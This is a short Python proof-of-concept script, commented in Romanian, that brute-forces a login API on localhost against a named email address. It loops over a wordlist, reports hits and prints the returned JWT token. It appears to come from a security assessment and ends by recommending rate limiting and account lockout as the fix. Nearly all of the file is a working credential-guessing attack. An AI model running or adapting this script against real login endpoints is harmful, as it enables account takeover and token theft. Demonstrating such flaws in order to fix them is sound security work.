
"""
4.3 - Brute Force
Demonstreaza ca nu exista limita de incercari la login.
"""

import requests
import time

BASE_URL = "http://localhost:5000"

TARGET_EMAIL = "cosmin203@gmail.com"

# Wordlist simpla (in practica: rockyou.txt)
WORDLIST = [
    "password", "123456", "qwerty", "abc123", "letmein",
    "monkey", "1234567", "dragon", "master", "sunshine",
    "princess", "welcome", "shadow", "superman", "michael",
    "football", "baseball", "iloveyou", "trustno1", "admin",
    "123",   # parola corecta simulata
    "hunter2",
]

print("=" * 60)
print("PoC 4.3 - Brute Force Attack")
print(f"Target: {TARGET_EMAIL}")
print("=" * 60)

start = time.time()
found = False

for i, pwd in enumerate(WORDLIST, 1):
    try:
        r = requests.post(
            f"{BASE_URL}/api/login",
            json={"email": TARGET_EMAIL, "password": pwd},
            timeout=5
        )
        elapsed = time.time() - start
        status_icon = "[HIT!]" if r.status_code == 200 else "[miss]"
        print(f"  {status_icon} #{i:03d} | parola='{pwd}' | HTTP {r.status_code} | t={elapsed:.2f}s")

        if r.status_code == 200:
            print(f"\n[!!!] PAROLA GASITA: '{pwd}'")
            print(f"[!!!] Token JWT: {r.json().get('token', 'N/A')[:60]}...")
            found = True
            break

    except Exception as e:
        print(f"  [ERR] #{i:03d} | {e}")

total = time.time() - start
print()
if not found:
    print(f"Parola nu e in wordlist. Incercate {len(WORDLIST)} parole in {total:.2f}s.")
print(f"\nConstatare: {len(WORDLIST)} incercari in {total:.2f}s. Nicio blocare.")
print("In practica cu rockyou.txt (14M parole) -> cont compromis in ore/minute.")
print("Fix: rate limiting (max 5 incercari/IP/minut) + lockout temporar.")
